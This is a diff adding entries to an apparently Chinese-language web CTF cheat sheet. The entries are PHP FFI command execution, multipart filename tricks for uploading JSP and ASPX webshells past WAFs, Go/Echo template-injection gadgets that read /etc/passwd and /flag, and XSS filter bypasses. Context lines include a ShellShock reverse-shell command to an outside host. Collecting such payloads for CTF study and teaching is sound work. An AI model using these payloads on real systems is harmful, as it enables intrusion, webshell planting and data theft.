@@ -776,6 +776,13 @@ echo file_get_contents('bar/etc/passwd');
     - PHP 7.4 feature
     - preloading + ffi
     - e.g. [RCTF 2019 - nextphp](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/nextphp)
+
+    ```php
+    <?php
+    $ffi = FFI::cdef("int system (const char* command);");
+    $ffi->system("id");
+    ```
+
 - [FastCGI Extension](https://github.com/w181496/FuckFastcgi)
 
 - Windows COM
@@ -2058,9 +2065,12 @@ HQL injection example (pwn2win 2017)
 - ...
 - 進階玩法
     - LFI RCE without controlling any file: https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
+    - Memory Limit Oracle to read local file: https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py
     - Example:
         - [hxp ctf 2021 - includer's revenge](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
         - [CakeCTF 2022 - ImageSurfing](https://ptr-yudai.hatenablog.com/#ImageSurfing)
+        - [DownUnderCTF 2022 - minimal-php](https://github.com/DownUnderCTF/Challenges_2022_Public/tree/main/web/minimal-php)
+        - [blaklisctf - chall3](https://twitter.com/Blaklis_/status/1625918537813446656)
 ## php://input
 
 - `?page=php://input`
@@ -2265,6 +2275,22 @@ HQL injection example (pwn2win 2017)
     - `47 49 36 38 39 61`
 - png
     - `89 50 4E 47`
+
+## 繞 WAF
+
+- Java (commons-fileupload)
+    - `filename` 前後塞 `%20`, `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%1c`, `%1d`, `%1e`, `%1f`
+        - e.g. `Content-Disposition: form-data; name="file"; %1cfilename%0a="shell.jsp"`
+    - Quotable-Printable / Base64 編碼
+        - `Content-Disposition: form-data; name="file"; filename="=?UTF-8?B?c2hlbGwuanNw?="`
+        - `Content-Disposition: form-data; name="file"; filename="=?UTF-8?Q?=73=68=65=6c=6c=2e=6a=73=70?="`
+    - Spring filename 編碼特性
+        - `Content-Disposition: form-data; name="file"; filename*="1.jsp"`
+        - `Content-Disposition: form-data; name="file"; filename*="UTF-8'1.jpg'1.jsp"`
+        - `Content-Disposition: form-data; name="file"; filename*="UTF-8'1.jpg'=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?="`
+- .NET (context.Request.files)
+    - 抓上傳檔名只匹配 `Content-Disposition:` 後的 `filename=xxx`
+    - `Content-Disposition:name="file"kaibrokaibrofilename=shell.aspx`
 
 ## 其他
 
@@ -2601,6 +2627,8 @@ print marshalled
         - ...
     - [BaRMIe](https://github.com/NickstaDB/BaRMIe)
         - 專打 Java RMI (enumerating, attacking)
+    - [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
+        - RMI vulnerability scanner
     - [marshalsec](https://github.com/mbechler/marshalsec)
     - [SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
         - 分析 Serialization Stream，如 Magic 頭、serialVersionUID、newHandle 等
@@ -2612,6 +2640,7 @@ print marshalled
     - [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)
 - [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
 - Example
+    - [0CTF 2022 - 3rm1](https://github.com/ceclin/0ctf-2022-soln-3rm1)
     - [Balsn CTF 2021 - 4pple Music](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#4pple-music)
     - [0CTF 2021 Qual - 2rm1](https://github.com/ceclin/0ctf-2021-2rm1-soln)
     - [0CTF 2019 Final - hotel booking system](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system)
@@ -2712,6 +2741,29 @@ Server-Side Template Injection
 - Example
     - [WCTF 2020 - thymeleaf](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
     - [DDCTF 2020 - Easy Web](https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/)
+
+## Golang
+
+- module
+    - [html/template](https://pkg.go.dev/html/template)
+    - [text/template](https://pkg.go.dev/text/template)
+- Testing
+    - `{{87}}`
+    - `{{.}}`
+    - `{{"meow"|print}}`
+    - `{{"<script>alert(/xss/)</script>"}}`
+    - `{{ .MyFunc "arg1" "arg2" }}`
+        - 需上下文有定義 `MyFunc` 函數
+    - ...
+- [Echo](https://github.com/labstack/echo) gadget
+    - `{{.File "/etc/passwd"}}`
+    - `{{.Echo.Filesystem.Open "/etc/passwd"}}`
+    - `{{.Echo.Static "/meow" "/"}}`
+    - Example:
+        - [ACSC CTF 2023 - easyssti](https://blog.hamayanhamayan.com/entry/2023/02/26/124239#web-easySSTI)
+            - `{{ $x := .Echo.Filesystem.Open "/flag" }} {{ $x.Seek 1 0 }} {{ .Stream 200 "text/plain" $x }}` (by @nyancat)
+            - `{{ (.Echo.Filesystem.Open "/flag").Read (.Get "template") }} {{ .Get "template" }}` (by @maple3142)
+            - `{{ $f := .Echo.Filesystem.Open "/flag" }} {{ $buf := .Get "template" }} {{ $f.Read $buf }} {{ $buf }` (by @Ocean)
 
 ## AngularJS
 - v1.6 後移除 Sandbox
@@ -3464,15 +3516,27 @@ require("./index.js")
         - `<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>` (16進位) (分號可去掉)
 - 繞空白
     - `<img/src='1'/onerror=alert(0)>`
+- 繞限制字元
+    - `<script>onerror=alert;throw 1</script>`
+    - `<script>{onerror=alert}throw 1</script>`
+    - `<script>throw onerror=alert,1</script>`
+    - `<script>throw[onerror]=[alert],1</script>`
+    - `<script>var{a:onerror}={a:alert};throw 1</script>`
+    - `<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>`
+    - `<script>new Function`X${document.location.hash.substr`1`}`</script>`
 ## 其他
 
 - 特殊標籤
     - 以下標籤中的腳本無法執行
     - `<title>`, `<textarea>`, `<iframe>`, `<plaintext>`, `<noscript>`...
 
-- 偽協議
+- Protocol
     - javascript:
         - `<a href=javascript:alert(1) >xss</a>`
+        - `<iframe src="javascript:alert(1)">`
+        - with new line: `<a href="javascript://%0aalert(1)">XSS</a>`
+        - assignable protocol with location: `<script>location.protocol='javascript'</script>`
+            - Example: [portswigger cheatsheet](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Elocation.protocol=%27javascript%27;%3C/script%3E#%0aalert(1)//&context=html)
     - data:
         - `<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>`
 - Javascript 自解碼機制
@@ -3490,6 +3554,7 @@ require("./index.js")
     - `(alert)(document.domain);`
     - `al\u0065rt(document.domain);`
     - `al\u{65}rt(document.domain);`
+    - `[document.domain].map(alert);`
     - `window['alert'](document.domain);`
     - `alert.call(null,document.domain);`
     - `alert.bind()(document.domain);`
@@ -4009,16 +4074,20 @@ state[i] = state[i-3] + state[i-31]`
     - jwt.io
 - 常見 Port 服務
     - http://packetlife.net/media/library/23/common_ports.pdf
-- `php -i | grep "Loaded Configuration File"`
-    
+- `php -i | grep "Loaded Configuration File"`    
     - 列出 php.ini 路徑
-
-- OPTIONS method
-    - 查看可用 HTTP method
-    - `curl -i -X OPTIONS 'http://evil.com/'`
+- HTTP Method
+    - OPTIONS method
+        - 查看可用 HTTP method
+        - `curl -i -X OPTIONS 'http://evil.com/'`
+    - HEAD method
+        - 特殊場景下容易出現邏輯問題 `if(request.method == get) {...} else {...}` 
+        - Werkzeug 只要有設定接受 `GET` 請求，也會自動接受 `HEAD` ([ref](https://werkzeug.palletsprojects.com/en/2.0.x/routing/#werkzeug.routing.Rule))
+        - Example: 
+            - [FwordCTF 2021 - Shisui](https://lebr0nli.github.io/blog/security/fwordCTF2021/#shisui-web)
+            - [Bypassing GitHub's OAuth flow](https://blog.teddykatz.com/2019/11/05/github-oauth-bypass.html)
 
 - ShellShock
-    
     - `() { :; }; echo vulnerable`
     - `() { :a; }; /bin/cat /etc/passwd`
     - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
@@ -4070,6 +4139,7 @@ state[i] = state[i-3] + state[i-31]`
     - Example: 
         - Olympic CTF 2014 - CURLing
         - [MidnightSun CTF 2019 - bigspin](https://balsn.tw/ctf_writeup/20190406-midnightsunctf/#bigspin)
+        - [PBCTF 2023 - Makima](https://nguyendt.hashnode.dev/pbctf-2023-writeup#heading-makima)
 
 
 - Nginx目錄穿越漏洞
